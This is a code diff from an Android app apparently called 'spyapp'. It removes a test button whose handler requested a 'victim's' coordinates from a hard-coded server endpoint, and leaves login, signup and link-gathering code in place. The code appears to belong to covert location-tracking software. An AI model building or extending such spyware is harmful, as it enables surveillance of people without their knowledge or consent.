@@ -29,7 +29,6 @@ public class MainActivity extends AppCompatActivity {
     private Button logbutton;
     private Button signupbutton;
     private ServerRequest req;
-    private Button cordsTest;
 
     public static final String BROADCAST_ACTION = "com.example.albert.spyapp;";
     private Permission permission;
@@ -46,7 +45,6 @@ public class MainActivity extends AppCompatActivity {
         password = (EditText)findViewById(R.id.passwordtextfield);
         signupbutton = (Button)findViewById(R.id.signupbutton);
         error = (TextView)findViewById(R.id.error);
-        cordsTest=(Button)findViewById(R.id.testCords);
 
         LinksAgregator linksAgregator=new LinksAgregator("tomeczek",getApplicationContext());
         linksAgregator.getLinks();
@@ -88,14 +86,6 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        cordsTest.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                Log.d("test clicked","clicked");
-                CordsRequest request=new CordsRequest("http://35.204.80.21:4567/victim/getCords/albi",getApplicationContext());
-                request.getCords();
-            }
-        });
       
         signupbutton.setOnClickListener(new View.OnClickListener() {
           
